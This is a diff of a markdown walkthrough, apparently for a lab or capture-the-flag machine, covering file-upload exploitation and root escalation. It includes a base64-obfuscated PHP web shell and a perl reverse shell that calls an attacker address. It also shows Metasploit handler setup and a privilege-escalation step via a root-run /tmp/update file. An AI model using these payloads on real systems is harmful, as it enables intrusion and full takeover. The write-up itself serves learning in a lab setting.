@@ -91,13 +91,16 @@ Successfully Uploaded a file.
 
 # Exploit
 Now we have full reigns on upload , you can upload a reverse php shell, backdoor etc. In this case we'll upload a basic php system call.
+
+##### Step 1. Create a backdoor
 ```
 echo 'system($_GET['cmd']);' | base64      // Not neccessary to encode it to base64
 echo "<?php eval(base64_decode('c3lzdGVtKCRfR0VUW2NtZF0pOwo=')) ?>" > evil.php
 ```
-Upload and Accessing the exploit: in URL
-http://192.168.114.132/test/evil.php?cmd="XXXXANYCOMMANDHERE"
-
+##### Step 2. Upload and Accessing the exploit: in URL
+```
+http://192.168.114.132/test/evil.php?cmd="ifconfig"
+```
 Using a basic perl reverse shell (Generated from msfvenom)  // port 1234 , will not return anything. Port 443 works!
 ```
 http://192.168.114.132/test/evil.php?cmd=192.168.114.132/test/test.php?cmd=/usr/bin/perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"192.168.21.31:1234");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
@@ -111,7 +114,13 @@ connect to [192.168.114.131] from (UNKNOWN) [192.168.114.132] 59858
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
-
+OR use multi/handler to pick up the connection
+```
+msfconsole
+use exploit/multi/handler
+set payload linux/x86/shell/reverse_tcp
+...
+```
 # Local Privilege Escalation
 
 Running a Linux Priv Checker ( Automated Script )
@@ -134,7 +143,7 @@ https://www.exploit-db.com/exploits/33899/
 "Result: The file /tmp/update will be executed as root, thus effectively
 rooting your box, if malicious content is placed inside the file."
 
-##### Steps 1. Create a bash, named "update"
+##### Step 1. Create a bash, named "update"
 ```
 #!/bin/sh
 
@@ -147,10 +156,10 @@ Using the same shell, we can get a root shell.
 #### Step 2. Upload to target machine, and place in /tmp/
 
 #### Wait.
+Using msfconsole/exploit/multi/handler 
 ```
 Command shell session 5 opened (192.168.114.131:443 -> 192.168.114.132:37026) at 2018-03-02 18:16:55 +1100
 ```
-
 ```
 id  
 uid=0(root) gid=0(root) groups=0(root)
